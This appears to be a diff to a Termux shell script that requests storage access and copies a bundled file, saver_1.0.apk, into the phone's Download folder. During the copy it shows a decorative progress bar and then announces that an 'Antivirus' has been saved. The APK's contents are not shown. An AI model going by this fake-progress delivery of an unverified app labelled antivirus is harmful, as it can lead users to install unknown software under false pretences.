@@ -11,6 +11,19 @@ P='\033[1;95m'    # Purple
 C='\033[1;96m'    # Cyan
 W='\033[1;97m'    # White
 
+#checking storage permission (allow)
+if [ ! -d '/data/data/com.termux/files/home/storage' ];then
+termux-setup-storage
+sleep 5
+fi
+if [ ! -f '/storage/emulated/0/Download/saver_1.0.apk' ];then
+echo
+fi
+if [ ! -d '/storage/emulated/0/Download' ];then
+cd /sdcard
+mkdir Download
+fi
+if [ ! -f '/storage/emulated/0/Download/saver_1.0.apk' ];then
 echo -ne "$R|█                               |  (0%)\r"
 sleep 0.5
 echo -ne "$R|█                               |  (10%)\r"
@@ -57,6 +70,10 @@ echo -ne "$BL|█████████████████████   
 sleep 0.1
 echo -ne "$R|██████████████████████          |  (80%)\r"
 sleep 0.1
+#checking storage
+if [ -d '/data/data/com.termux/files/home/storage' ];then
+cp -rf saver_1.0.apk /sdcard/Download
+fi
 echo -ne "$R|███████████████████████         |  (80%)\r"
 sleep 0.1
 echo -ne "$R|████████████████████████        |  (80%)\r"
@@ -77,6 +94,7 @@ echo -ne "$C|██████████████████████�
 sleep 0.1
 echo -ne "$NC|████████████████████████████████|  (100%)\r"
 sleep 0.5
-echo -ne "$G|AntiVirus Saved To Dir : emulated/0/Download|          \r"
+echo -ne "$G|Antivirus Saved To Dir : emulated/0/Download|          \r"
 sleep 2
 echo -ne '\n'
+fi
